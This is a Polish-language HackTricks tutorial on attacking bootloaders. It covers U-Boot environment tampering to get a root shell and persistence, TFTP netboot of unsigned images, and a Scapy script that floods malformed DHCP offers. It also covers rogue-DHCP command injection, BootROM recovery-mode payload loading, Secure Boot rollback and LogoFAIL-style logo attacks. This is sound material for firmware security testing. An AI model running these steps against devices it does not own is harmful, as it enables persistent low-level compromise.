# Bootloader Testing

{{#include ../../banners/hacktricks-training.md}}

Poniższe kroki są zalecane do modyfikowania konfiguracji startu urządzenia i testowania bootloaderów takich jak U-Boot i UEFI-class loaders. Skoncentruj się na uzyskaniu wczesnego wykonania kodu, ocenie zabezpieczeń podpisów/rollback oraz nadużyciach ścieżek recovery lub network-boot.

## U-Boot — szybkie triki i nadużywanie środowiska

1. Dostęp do interpretera (shell)
- Podczas bootu naciśnij znany klawisz przerwania (często dowolny klawisz, 0, spacja lub specyficzna dla płytki "magiczna" sekwencja) przed wykonaniem `bootcmd`, aby dostać się do promptu U-Boot.

2. Sprawdź stan bootu i zmienne
- Przydatne polecenia:
- `printenv` (zrzut environment)
- `bdinfo` (info o płytce, adresy pamięci)
- `help bootm; help booti; help bootz` (obsługiwane metody bootowania kernela)
- `help ext4load; help fatload; help tftpboot` (dostępne loadery)

3. Modyfikacja argumentów bootu, by uzyskać root shell
- Dopisz `init=/bin/sh`, aby kernel zamiast normalnego init uruchomił shell:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. Netboot z twojego serwera TFTP
- Skonfiguruj sieć i pobierz kernel/fit image z LAN:
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Utrwalanie zmian przez environment
- Jeśli pamięć env nie jest write-protected, można utrwalić kontrolę:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- Sprawdź zmienne takie jak `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets`, które wpływają na ścieżki fallback. Nieprawidłowe wartości mogą dawać powtarzalne przerwania do shella.

6. Sprawdź debug/unsafe funkcje
- Szukaj: `bootdelay` > 0, wyłączone `autoboot`, nieograniczone `usb start; fatload usb 0:1 ...`, możliwość `loady`/`loads` przez serial, `env import` z niezaufanych nośników oraz kerneli/ramdisków ładowanych bez sprawdzenia podpisu.

7. Testowanie weryfikacji obrazów U-Boot
- Jeśli platforma deklaruje secure/verified boot z obrazami FIT, spróbuj zarówno unsigned, jak i zmodyfikowanych obrazów:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- Brak `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` lub legacy zachowanie `verify=n` często pozwala na bootowanie dowolnych payloadów.

## Powierzchnia network-boot (DHCP/PXE) i rogue serwery

8. Fuzzing parametrów PXE/DHCP
- Legacy obsługa BOOTP/DHCP w U-Boot miała problemy z bezpieczeństwem pamięci. Na przykład CVE‑2024‑42040 opisuje memory disclosure przez spreparowane odpowiedzi DHCP, które mogą leakować bajty z pamięci U-Boot z powrotem na sieć. Testuj ścieżki DHCP/PXE używając nadmiernie długich/granicznych wartości (option 67 bootfile-name, vendor options, file/servername fields) i obserwuj zawieszenia/leaki.
- Minimalny snippet Scapy do obciążania parametrów boot podczas netboot:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- Zweryfikuj także, czy pola nazwy pliku PXE są przekazywane do logiki shell/loader bez sanitizacji, zwłaszcza gdy są łańcuchowane do skryptów provisioning po stronie OS.

9. Rogue DHCP — testy command injection
- Skonfiguruj rogue DHCP/PXE service i spróbuj wstrzykiwać znaki do pól filename lub options, aby dotrzeć do interpreterów poleceń w późniejszych etapach łańcucha boot. Metasploit’s DHCP auxiliary, `dnsmasq` lub własne skrypty Scapy sprawdzą się dobrze. Najpierw odizoluj sieć laboratoryjną.

## Tryby recovery BootROM SoC, które nadpisują normalny boot

Wiele SoC udostępnia BootROM "loader" mode, który przyjmuje kod przez USB/UART nawet jeśli obrazy w flash są niepoprawne. Jeśli secure-boot fuses nie są przepalone, daje to wczesne, arbitralne wykonanie kodu bardzo wcześnie w łańcuchu.

- NXP i.MX (Serial Download Mode)
- Narzędzia: `uuu` (mfgtools3) lub `imx-usb-loader`.
- Przykład: `imx-usb-loader u-boot.imx` do wgrania i uruchomienia custom U-Boot z RAM.
- Allwinner (FEL)
- Narzędzie: `sunxi-fel`.
- Przykład: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` lub `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Narzędzie: `rkdeveloptool`.
- Przykład: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` do przygotowania loadera i wgrania custom U-Boot.

Oceń, czy urządzenie ma przetopione eFuses/OTP dla secure-boot. Jeśli nie, tryby BootROM download często pomijają wyższe poziomy weryfikacji (U-Boot, kernel, rootfs) przez wykonanie twojego first-stage payload bezpośrednio z SRAM/DRAM.

## UEFI/PC-class bootloaders: szybkie kontrole

10. Modyfikacja ESP i testy rollback
- Zamontuj EFI System Partition (ESP) i sprawdź komponenty loadera: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, ścieżki logo vendorów.
- Spróbuj bootować z downgraded lub znanymi-wulnerable signed komponentami boot jeśli revokacje Secure Boot (dbx) nie są aktualne. Jeśli platforma nadal ufa starym shimom/bootmanagerom, często można załadować własny kernel lub `grub.cfg` z ESP, aby uzyskać trwałość.

11. Błędy parsowania logo (klasa LogoFAIL)
- Kilka firmware OEM/IBV było podatnych na błędy parsowania obrazów w DXE, które przetwarzają boot logo. Jeśli atakujący może umieścić spreparowany obraz na ESP w vendor-specyficznym path (np. `\EFI\<vendor>\logo\*.bmp`) i rebootować, możliwe jest wykonanie kodu podczas wczesnego boot nawet przy włączonym Secure Boot. Sprawdź, czy platforma akceptuje logo dostarczone przez użytkownika i czy te ścieżki są zapisywalne z poziomu OS.

## Ostrzeżenia dotyczące hardware

Zachowaj ostrożność przy interakcji z SPI/NAND flash podczas wczesnego boot (np. uziemianie pinów by pominąć odczyty) i zawsze konsultuj datasheet flash. Źle czasowane zwarcia mogą uszkodzić urządzenie lub programator.

## Notatki i dodatkowe wskazówki

- Spróbuj `env export -t ${loadaddr}` i `env import -t ${loadaddr}` aby przenosić bloby environment między RAM a storage; niektóre platformy pozwalają importować env z wymiennych mediów bez uwierzytelnienia.
- Dla trwałości na systemach Linux bootujących przez `extlinux.conf`, modyfikacja linii `APPEND` (w celu wstrzyknięcia `init=/bin/sh` lub `rd.break`) często wystarcza, gdy nie ma wymuszonych sprawdzeń podpisów.
- Jeśli userland udostępnia `fw_printenv/fw_setenv`, zweryfikuj, że `/etc/fw_env.config` odpowiada faktycznemu storage env. Nieprawidłowe offsety pozwalają czytać/pisać niewłaściwy region MTD.

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)

{{#include ../../banners/hacktricks-training.md}}
